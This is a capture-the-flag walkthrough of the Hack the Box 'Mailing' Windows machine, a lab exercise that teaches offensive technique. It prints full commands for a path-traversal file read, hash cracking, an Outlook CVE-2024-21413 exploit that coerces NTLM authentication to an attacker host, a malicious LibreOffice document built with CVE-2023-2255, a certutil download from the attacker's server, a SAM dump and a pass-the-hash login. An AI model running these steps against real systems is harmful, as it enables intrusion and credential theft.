---
title: "Hack the Box - Mailing"
slug: "hack-the-box-mailing"
date: "2024-03-14"
excerpt: "Mailing is an easy Windows machine that runs `hMailServer` and hosts a website vulnerable to `Path Traversal`. This vulnerability can be exploited to access the `hMailServer` configuration file, revealing the Administrator password hash. Cracking this hash provides the Administrator password for the email account. We leverage CVE-2024-21413 in the Windows Mail application on the remote host to capture the NTLM hash for user `maya`. We can then crack this hash to obtain the password and log in as user `maya` via WinRM. For privilege escalation, we exploit CVE-2023-2255 in `LibreOffice`."
cover: "cover.png"
tags:
  - Path Traversal
  - hMailServer
  - CVE-2024-21413
  - CVE-2023-2255
---

## Summary
### System Information
```text
IP: 10.10.11.14
OS: Windows
Hostname: mailing.htb
```

### Credentials
```text

```

### Hashes
```text

```

### Ports
```text
25/tcp    open  smtp          hMailServer smtpd
80/tcp    open  http          Microsoft IIS httpd 10.0
110/tcp   open  pop3          hMailServer pop3d
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
587/tcp   open  smtp          hMailServer smtpd
993/tcp   open  ssl/imap      hMailServer imapd
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
62926/tcp open  msrpc         Microsoft Windows RPC
```

***

## Enumeration
### NMAP

```bash
nmap -sC -sV -v -p- -T4 -oN scans/nmap.txt 10.10.11.14
```

```text
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Mailing
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: TOP UIDL USER
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: OK IMAP4 QUOTA RIGHTS=texkA0001 IMAP4rev1 ACL NAMESPACE CAPABILITY completed SORT IDLE CHILDREN
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32 df3f 1d16 08b8 99d2 e39b 6467 297e
|_SHA-1: 5c3e 5265 c5bc 68ab aaac 0d8f ab8d 90b4 7895 a3d7
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
587/tcp   open  smtp          hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32 df3f 1d16 08b8 99d2 e39b 6467 297e
|_SHA-1: 5c3e 5265 c5bc 68ab aaac 0d8f ab8d 90b4 7895 a3d7
993/tcp   open  ssl/imap      hMailServer imapd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32 df3f 1d16 08b8 99d2 e39b 6467 297e
|_SHA-1: 5c3e 5265 c5bc 68ab aaac 0d8f ab8d 90b4 7895 a3d7
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: OK IMAP4 QUOTA RIGHTS=texkA0001 IMAP4rev1 ACL NAMESPACE CAPABILITY completed SORT IDLE CHILDREN
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
62926/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-17T10:17:20
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

Add `mailing.htb` to `/etc/hosts`.

```bash
sudo "10.10.11.14 mailing.htb" >> /etc/hosts
```

### Website

Website on port `80`. Mentions use of `hMailServer`.

![](evidence/screenshots/2024-05-18-18-49-14.png)

Download instructions PDF.

![](evidence/screenshots/2024-05-18-18-51-12.png)

Mentions a `maya@mailing.htb` user.

### LFI

If we take a look at the download link for the instructions PDF, we find that it defines the file to download. We can replace this with an LFI payload.

![](evidence/screenshots/2024-05-18-18-55-38.png)

```bash
/download.php?file=../../windows/system32/drivers/etc/hosts
```

![](evidence/screenshots/2024-05-18-18-57-43.png)

### hMailServer

We know that the server is running `hMailServer`. Let's try and see if we can dump a configuration file.

After looking at a [forum post](https://www.hmailserver.com/forum/viewtopic.php?t=38903) we can find that a `hMailServer.ini` file should be located in `C:\Program Files (x86)\hMailServer\bin\` directory.

![](evidence/screenshots/2024-05-18-19-27-02.png)

We can see that file contains an `AdministratorPassword`.

Using `name-that-hash` we can see the type of hash is MD5.

```bash
name-that-hash --text '841bb5acfa6779ae432fd7a4e6600ba7'
```

We can use `hashcat` to crack the password.

```bash
hashcat -m 0 '841bb5acfa6779ae432fd7a4e6600ba7' /usr/share/wordlists/rockyou.txt
```

We get:

```text
841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator
```

## Foothold
### CVE 2024-21413

Microsoft Outlook recently had a vulnerability which allows for RCE. Let's try it [here](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability).

```bash
https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.git
```

We can run it using the information we've gathered already. We also know `maya` has an email account.

```bash
python3 CVE-2024-21413.py --server mailing.htb --port 587 --username "administrator@mailing.htb" --password "homenetworkingadministrator" --sender "administrator@mailing.htb" --recipient "maya@mailing.htb" --url "10.10.16.13/test" --subject "subject"
```

Before running the above command we also need to setup `responder` to capture the NTLM hash.

```bash
sudo python3.9 Responder.py -I tun0 -v
```

After a few seconds we should see a response.

![](evidence/screenshots/2024-05-18-19-59-00.png)

We can save the above hash to a file and crack is using `hashcat`.

```bash
hashcat -m 5600 responder.out /usr/share/wordlists/rockyou.txt
```

We get:

```text
MAYA::MAILING:9a0aa78e9adfa915:2a70516d870f4b11a91d264fe33dd9ad:0101000000000000009904a75da9da01cfa694792588bb9000000000020008005a004d004500520001001e00570049004e002d00330031004e004e00450048004e004900510036004c0004003400570049004e002d00330031004e004e00450048004e004900510036004c002e005a004d00450052002e004c004f00430041004c00030014005a004d00450052002e004c004f00430041004c00050014005a004d00450052002e004c004f00430041004c0007000800009904a75da9da01060004000200000008003000300000000000000000000000002000000eb0fa66cd129f2cf5415ee6bc075ea9f8bc01fcc530ff64412b02c6f7cb20a30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00310033000000000000000000:m4y4ngs4ri
```

We can use `evil-winrm` to get a shell on the machine.

```bash
evil-winrm -i mailing.htb -u maya -p m4y4ngs4ri
```

![](evidence/screenshots/2024-05-18-20-06-27.png)

## Privilege Escalation

We an see `LibreOffice` in `Program Files`.

![](evidence/screenshots/2024-05-18-20-07-56.png)

If we look for the readme file in the directory, we can find the version number installed.

![](evidence/screenshots/2024-05-18-20-09-09.png)

After a quick search we find an [exploit POC](https://github.com/elweth-sec/CVE-2023-2255).

```bash
git clone https://github.com/elweth-sec/CVE-2023-2255.git 
```

We can create a payload to execute via the python exploit. We can use this to add `maya` to the `Administradores` group.

```bash
python3 CVE-2023-2255.py --cmd "net localgroup Administradores maya /add"
```

We can start a `http.server` on our local machine and transfer the `output.odt` file to the target.

```bash
python3 -m http.server 80
```

And on the target we can download the file.

```powershell
certutil -urlcache -f http://10.10.16.13/output.odt output.odt
```

We're now part of the `Administradores` group!

![](evidence/screenshots/2024-05-18-20-25-35.png)

### Dump SAM

```bash
crackmapexec smb mailing.htb -u maya -p m4y4ngs4ri --local-auth --sam
```

![](evidence/screenshots/2024-05-18-20-28-11.png)

We can use `evil-winrm` and the LM hash for `localadmin` to get a shell.

```bash
evil-winrm -i mailing.htb -u localadmin -H 9aa582783780d1546d62f2d102daefae
```

![](evidence/screenshots/2024-05-18-20-33-58.png)